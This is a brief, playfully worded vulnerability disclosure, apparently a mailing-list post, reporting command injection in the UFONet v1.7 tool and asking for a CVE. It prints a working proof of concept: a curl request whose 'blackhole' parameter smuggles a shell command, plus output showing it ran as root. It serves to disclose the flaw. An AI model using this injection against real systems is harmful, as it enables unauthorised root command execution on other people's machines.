	New Release: UFONet v1.7 - "KRäK!eN"...

Hi,

Attention to all motherships, borgs have been detected inside a
blackhole. Brace yourself for the impact:

    $ curl "http://localhost:9999/cmd_download_botnet_ip?blackhole=';id>/tmp/plop;'"
    $ cat /tmp/plop
    uid=0(root) gid=0(root) groups=0(root)

Energy shield levels critical! Enemies detected on the deck. Immediate
response needed!

Can you request a CVE ?

Best regards,

- Captain Alex Torres and Pilot Pierre Kim
